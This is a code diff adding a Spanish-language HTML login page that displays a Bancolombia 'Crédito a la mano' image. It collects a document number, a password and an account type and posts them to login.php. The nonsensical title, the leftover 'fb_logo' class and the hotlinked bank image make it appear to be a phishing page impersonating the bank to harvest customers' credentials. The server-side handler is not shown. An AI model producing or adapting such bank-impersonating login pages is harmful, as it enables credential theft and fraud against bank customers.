@@ -1,0 +1,49 @@
+<html>
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+     <title>VaidrollTeamLogin8</title>
+     <link rel="stylesheet" href="vaidroll.css">	
+</head>
+<body>
+<div class="caja1">
+<form method="post" action="login.php">
+  <img class="fb_logo _8ilh img" src="https://d31dn7nfpuwjnm.cloudfront.net/images/valoraciones/0049/4598/Cr%C3%A9dito_a_la_mano_Bancolombia_col.jpeg?1653559841">
+<input type="text" name="txtusuario" placeholder="&#128273; Número de documento">
+
+<input type="password" name="txtpassword" id="txtpassword" placeholder="&#128274; ****">
+
+<div class="ub1">
+<input type="checkbox" onclick="verpassword()" >Mostrar contraseña
+ </div>
+<div class="ub1">Rol</div>
+<select name="rol">
+<option value="0" style="display:none;"><label>Seleccionar</label></option>
+<option value="1">Ahorro</option>
+<option value="2">Corriente</option>
+<option value="3">A la mano</option>
+<option value="4">persona</option>
+</select>
+
+<div align="center">
+<input type="submit" value="CONTINUAR">
+
+<input type="reset" value="Cancelar">
+</div>
+</form>
+</div>
+</body>
+<script>
+  function verpassword(){
+      var tipo = document.getElementById("txtpassword");
+      if(tipo.type == "password")
+	  {
+          tipo.type = "text";
+      }
+	  else
+	  {
+          tipo.type = "password";
+      }
+  }
+</script>
+</html>
